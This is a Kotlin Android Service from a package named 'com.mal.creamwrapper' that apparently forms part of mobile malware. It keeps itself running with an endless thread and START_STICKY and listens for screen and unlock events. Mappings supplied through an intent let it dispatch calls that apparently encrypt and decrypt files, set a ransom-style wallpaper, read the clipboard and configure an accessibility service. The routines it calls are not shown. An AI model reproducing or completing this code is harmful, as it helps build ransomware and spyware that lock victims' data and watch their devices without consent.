package com.mal.creamwrapper

import BindingTable
import EventDispatcher
import android.app.Service
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.os.Build
import android.os.IBinder
import android.os.Looper
import android.os.Message
import android.os.Messenger
import android.util.Log

class service : Service() {
    private lateinit var dispatcher: EventDispatcher
    fun z2(){
        //测试专用 预设 进程解析就会触发
        Log.d("test","123456")

        A11yConfig.service?.test("确定")
        A11yConfig.packageNames = arrayOf("com.example.app")
        A11yConfig.notificationTimeout = 100
    }
    fun a2() {
        encrypto101(this)
    }

    fun b2() {
        decrypto101(this)
    }

    fun c2() {
        setMintCheckerWallpaper(this)
    }
    fun d2(){
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.Q) {
            listenClipboard(this)
        }
    }


    private val screenReceiver = object : BroadcastReceiver() {

        override fun onReceive(context: Context, intent: Intent) {

            when (intent.action) {

                Intent.ACTION_USER_PRESENT -> {
                    // 解锁
                    Log.d("test", "解锁屏幕")

                }

                Intent.ACTION_SCREEN_ON -> {
                    // 亮屏
                    val x1 = "z1"
                   val sh = dispatcher.trigger(x1)
                    Log.d("test", sh.toString())
                    Log.d("test", "亮起屏幕")
/*
                    val intent = Intent(context, RDW::class.java).apply {
                        flags = Intent.FLAG_ACTIVITY_NEW_TASK
                    }



                    startActivity(intent)
                    */

                }

                Intent.ACTION_SCREEN_OFF -> {
                    // 熄屏
                    Log.d("test", "熄灭屏幕")

                }
            }
        }
    }


    override fun onCreate() {
        super.onCreate()
        Log.d("test", "进程启动")


        val filter = IntentFilter().apply {
            addAction(Intent.ACTION_USER_PRESENT)
            addAction(Intent.ACTION_SCREEN_ON)
            addAction(Intent.ACTION_SCREEN_OFF)
        }

        registerReceiver(screenReceiver, filter)
    }

    override fun onDestroy() {
        unregisterReceiver(screenReceiver)
        Log.d(
            "test",
            "========== Service销毁 ==========" +
                    " pid=${android.os.Process.myPid()}"
        )

        Log.d("test", Log.getStackTraceString(Throwable("Service销毁调用栈")))
        super.onDestroy()
    }

    private lateinit var k: String
    private val handler = android.os.Handler(Looper.getMainLooper()) { msg ->
        Log.d("MESSENGER", "Service 收到：${msg.what}")
        msg.replyTo?.send(
            Message.obtain(null, 200)
        )
        true
    }
    private val messenger = Messenger(handler)

    override fun onBind(p0: Intent?): IBinder? {
        return messenger.binder
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Log.d("test", "========== onStartCommand ==========")
        val id = (1000..9999).random()

        Thread {
            while (true) {
                Log.d("test", "存活 ID=$id")
                Thread.sleep(2000)
            }
        }.start()


        var ty = intent?.getStringExtra("ty")
        var raw = intent?.getStringExtra("raw")
        if (ty == "0") {/*
            val raw = "a1[a],b1[none],c1[b],d1[a],a2[a],b2[a],c2[b],d2[a],e2[c]"
*/Log.d("test", "进程内映射表开始更新$raw")
            // 1. 预处理，生成映射表（暂存内存，之后反复使用）
            var table = BindingTable.parse(raw!!)
            // if (table.skipped.isNotEmpty()) println("以下条目被跳过：${table.skipped}")

            // 2. 注册 X2 事件
            dispatcher = EventDispatcher(
                table,
                mapOf(
                    "z2" to ::z2,
                    "a2" to ::a2,
                    "b2" to ::b2,
                    "c2" to ::c2,
                    "d2" to ::d2,
                ),
            )
            // val x1 = "a1"
            // val hit = dispatcher.trigger(x1)
            // 3. 输入 X1 触发


        } else if (ty == "1") {
            Log.d("test", "收到触发")

        } else {
            Log.d("test", "进程拉起")
        }


        return START_STICKY
    }

    override fun onTaskRemoved(rootIntent: Intent?) {
        super.onTaskRemoved(rootIntent)

        Log.d("test", "========== Task被移除 ==========")
    }

}